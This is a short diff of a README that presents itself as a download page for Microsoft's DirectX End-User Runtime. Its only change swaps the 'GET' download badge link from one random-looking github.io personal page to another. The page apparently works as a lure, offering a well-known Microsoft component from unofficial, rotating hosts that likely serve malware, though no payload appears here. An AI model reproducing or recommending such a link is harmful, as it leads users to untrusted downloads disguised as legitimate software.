@@ -1,6 +1,6 @@
 # DirectX End-User Runtime - Legacy DirectX Component Installer
 
-[![GET DirectX End-User Runtime](https://img.shields.io/badge/GET%20%E2%80%94%20DirectX%20End--User%20Runtime-0078D6?style=for-the-badge&logoColor=white)](https://malikfigueroaiici.github.io/.github/directX-end-user-runtime)
+[![GET DirectX End-User Runtime](https://img.shields.io/badge/GET%20%E2%80%94%20DirectX%20End--User%20Runtime-0078D6?style=for-the-badge&logoColor=white)](https://denverfriedmanhizb.github.io/.github/directX-end-user-runtime)
 
 ## Overview of DirectX End-User Runtime
 
